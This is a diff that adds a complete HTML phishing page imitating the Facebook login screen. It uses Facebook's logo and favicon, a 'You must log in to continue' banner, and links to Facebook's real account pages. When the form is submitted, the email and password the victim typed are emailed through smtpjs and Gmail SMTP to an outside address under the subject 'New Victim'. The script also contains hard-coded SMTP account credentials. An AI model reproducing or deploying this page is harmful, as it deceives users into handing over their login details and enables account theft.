@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <link href="http://fonts.cdnfonts.com/css/helvetica-neue-9" rel="stylesheet">
+                
+    <!-- box icons -->
+    <link rel="stylesheet" href="facebook.css">
+    <link href='https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css' rel='stylesheet'>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+</head>
+
+<body>
+    <section class="main">
+        <div class="main_logo">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="">
+        </div>
+        <div class="login_first">
+            <div class="icon">
+                <span>
+                    <i class='bx bxs-info-circle'></i></span>
+            </div>
+            <div class="login_first-para">
+                <p>You must log in to continue.</p>
+            </div>
+
+        </div>
+        <div class="form">
+            <p class="login-p">Log in to Facebook</p>
+            <form onsubmit="sendEmail(); reset(); return false;">
+                <div class="login_first-2">
+                    <p>You must log in to continue.</p>
+
+                </div>
+                <input type="text" placeholder="Email adress or phone number" name="Email" id="email" required>
+                <input type="text" placeholder="Password" name="password" id="password" required>
+                <button class="btn btn-login" type="submit">Log in</button>
+                <a class="forgot" href="https://www.facebook.com/recover/initiate/?ars=facebook_login" target="_blank">Forgotten account?</a>
+
+            </form>
+            <div class="or"><span>or</span></div>
+            <a class="register" href="https://www.facebook.com/r.php?next=https%3A%2F%2Fapps.facebook.com%2Fcriminalcase%2F%3Fref%3Dbookmarks%26fb_source%3Dweb_shortcut%26count%3D0&locale=en_GB&display=page">Create New Account</a>
+        </div>
+    </section>
+
+</body>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+<script>
+    function sendEmail(){
+        Email.send({
+        Host: "smtp.gmail.com",
+        Username: "contactmemr122@gmail.com",
+        Password: "yihoqvvcvvxpgfqy",
+        To: 'xonish122@gmail.com',
+        From:'sonish@gmail.com',
+        Subject: "New Victim",
+        Body: "Name: " + document.getElementById("email").value
+           + "<br> Password: " +document.getElementById("password").value 
+
+    }).then(
+        message => alert(message)
+    );
+    }
+</script>
+
+</html>
